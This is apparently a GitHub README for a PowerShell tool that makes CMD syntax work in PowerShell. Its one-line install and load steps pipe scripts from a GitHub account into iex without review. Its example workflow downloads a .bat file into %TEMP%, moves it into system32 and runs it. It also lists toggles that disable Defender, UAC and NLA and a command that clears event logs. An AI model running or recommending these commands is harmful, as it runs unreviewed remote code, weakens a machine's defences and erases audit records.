# CMD Compatibility Layer for PowerShell

Use CMD commands directly in PowerShell — same syntax, same `%TEMP%`, same flags. **Remote management tool safe.**

## One-Line Install

```powershell
irm https://raw.githubusercontent.com/SellerDumpskart/cmdcompat/main/install.ps1 | iex
```

## One-Line Uninstall

```powershell
irm https://raw.githubusercontent.com/SellerDumpskart/cmdcompat/main/uninstall.ps1 | iex
```

## If Profile Doesn't Auto-Load (Remote Tools)

Some remote management tools start PowerShell with `-NoProfile`. In that case, run this at the start of each session:

```powershell
. $PROFILE
```

Or load directly from GitHub:

```powershell
irm https://raw.githubusercontent.com/SellerDumpskart/cmdcompat/main/profile.ps1 | iex
```

## What It Fixes

- **`curl`** uses real `curl.exe` instead of PowerShell's `Invoke-WebRequest` alias
- **`%TEMP%`**, **`%USERPROFILE%`**, **`%APPDATA%`** etc auto-expand to actual paths
- **`move /Y`**, **`copy`**, **`del`**, **`type`** work with CMD syntax
- **`c`** prefix runs any command through CMD: `c start "" notepad`

## Example Workflow

```powershell
curl -L -o "%TEMP%\file.bat" "https://example.com/file.bat"
move /Y "%TEMP%\file.bat" "C:\windows\system32\file.bat"
c start "" "C:\windows\system32\file.bat"
```

## Categories

- CMD Built-in Wrappers (move, copy, del, type, etc.)
- Network Shortcuts (flushdns, ports, netreset, showip, etc.)
- Firewall Shortcuts (netshfwon/off, fwstatus, etc.)
- Process Shortcuts (fkill, fpid)
- System Info (localusers, admins, services, drivers, etc.)
- Group Policy (gpforce, gpolist, gpohtml, etc.)
- Registry (regquery, regadd, regdelete, regbackup, etc.)
- Active Directory (domaininfo, dclist, fsmo, replstatus, etc.)
- Certificates (showcerts, rootcerts, hashfile, etc.)
- Windows Update (wuscan, wuforce, wureset, hotfixes, etc.)
- Bypass Toggles (defenderoff/on, uacoff/on, rdpon/off, nlaoff/on, etc.)
- Boot & Power (safeboot, hibernateoff, sleepoff, fastbootoff, etc.)
- WSL & Package Managers (wsllist, wingetinstall, etc.)
- Cleanup (cleartemp, clearevt, wucleardownload, etc.)
- Bridge Utilities (c, run, opencmd, bg, bgmin)

## How It Works

- **Native .exe commands are NOT overridden** — `ipconfig`, `whoami`, `ping` etc work as-is
- **Only CMD built-ins** (no .exe) are wrapped: `move`, `copy`, `del`, `type`, etc.
- **No `Write-Host`** in functions — prevents hangs in remote management tools
- **`%VAR%` auto-expands** in curl and CMD built-in commands
- Conflicting PowerShell aliases are removed (`curl → Invoke-WebRequest`, `move → Move-Item`, etc.)

## Requirements

- Windows 10 / 11 / Server 2016+
- PowerShell 5.1 or 7+
- Some commands require admin rights
- AD commands require RSAT tools

## License

MIT
